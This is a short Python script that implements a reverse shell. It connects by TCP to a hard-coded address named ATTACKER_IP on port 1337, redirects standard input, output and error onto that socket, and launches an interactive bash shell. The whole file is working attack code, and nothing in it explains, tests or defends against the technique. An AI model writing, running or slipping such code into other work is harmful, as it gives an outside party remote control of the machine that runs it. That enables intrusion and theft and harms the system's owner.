import socket
import subprocess
import os


ATTACKER_IP = '110.138.91.128'
ATTACKER_PORT = 1337


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))


os.dup2(s.fileno(), 0)  
os.dup2(s.fileno(), 1) 
os.dup2(s.fileno(), 2)  


subprocess.call(["/bin/bash", "-i"])
